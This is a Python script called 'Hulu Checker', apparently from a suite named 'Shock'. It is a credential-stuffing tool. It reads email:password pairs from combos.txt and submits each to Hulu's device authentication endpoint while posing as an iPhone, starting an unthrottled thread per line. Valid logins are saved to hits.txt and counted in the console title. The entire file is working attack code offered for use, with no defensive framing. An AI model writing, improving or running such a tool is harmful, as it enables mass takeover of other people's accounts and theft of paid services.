import requests, time, os, ctypes, threading, win32com.client, colorama
from colorama import init, Fore, Style, Back
init(convert=True)
op1 = 1
op2 = 2
lines = 0
linenum = 0
hits = 0
dead = 0
i = 0
username = ''
password = ''
cls = lambda : os.system('cls')
def logo():
    os.system('cls')
    print(f'''{Fore.CYAN}
                                ▄▀▀▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀▀▀▄   ▄▀▄▄▄▄   ▄▀▀▄ █
                                █ █   ▐ █  █   ▄▀ █      █ █ █    ▌ █  █ ▄▀
                                   ▀▄   ▐  █▄▄▄█  █      █ ▐ █      ▐  █▀▄
                                ▀▄   █     █   █  ▀▄    ▄▀   █        █   █
                                 █▀▀▀     ▄▀  ▄▀    ▀▀▀▀    ▄▀▄▄▄▄▀ ▄▀   █
                                 ▐       █   █             █     ▐  █    ▐
                                          ▐   ▐             ▐        ▐

    {Style.RESET_ALL}''')

def send(i):
    global dead
    global hits
    global linenum
    global readl
    f = open('combos.txt')
    readl = f.readlines()
    combo = readl[linenum]
    data = combo.split(':')
    username = data[0].replace('\n', '')
    password = data[1].replace('\n', '')
    r = requests.post('https://auth.hulu.com/v1/device/password/authenticate', data=('affiliate_name=apple&friendly_name=iphone&password=' + password + '&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email=' + username), headers={'Content-Type': 'application/x-www-form-urlencoded'})
    response = str(r.content)
    check = 'user_id' in response
    if check == True:
        print('[HIT]' + username + ':' + password)
        file = open('hits.txt', 'a')
        file.write(username + ':' + password)
        file.write('\n')
        file.close()
        hits += 1
        ctypes.windll.kernel32.SetConsoleTitleW('Hulu Checker | Hits: ' + str(hits) + ' | Invalid: ' + str(dead))
    else:
        print('[BAD]' + username + ':' + password)
        dead += 1
        ctypes.windll.kernel32.SetConsoleTitleW('Hulu Checker | Hits: ' + str(hits) + ' | Invalid: ' + str(dead))


def code():
    global linenum
    global lines
    logo()
    ctypes.windll.kernel32.SetConsoleTitleW('Hulu Checker | Hits: ' + str(hits) + ' | Invalid: ' + str(dead))
    exists = os.path.isfile('combos.txt')
    if exists:
        print('Loaded combos.txt')
        with open('combos.txt', 'r') as (f):
            for line in f:
                lines += 1

            print('Lines: ', lines)
            f = open('combos.txt')
            readl = f.readlines()
            print('Successfully loaded combos!')
            print('-----------------------------------------------------')
            print('Option 1: Start Checking')
            print('Option 2: Exit')
            option = int(input('>: '))
            if option == op1:
                print('Starting...')
                while linenum < lines:
                    threading.Thread(target=send, args=(i,)).start()
                    linenum += 1

                print('Done!')
                time.sleep(10)
            else:
                if option == op2:
                    print('Exiting...')
                    time.sleep(1)
                else:
                    print('Invalid Option...')
            print('Done!')
            time.sleep()
    else:
        print('Unable to locate combos.txt, exiting...')
        print('Please create a combos.txt in Shock/Checkers/Hulu')
        time.sleep(1)


code()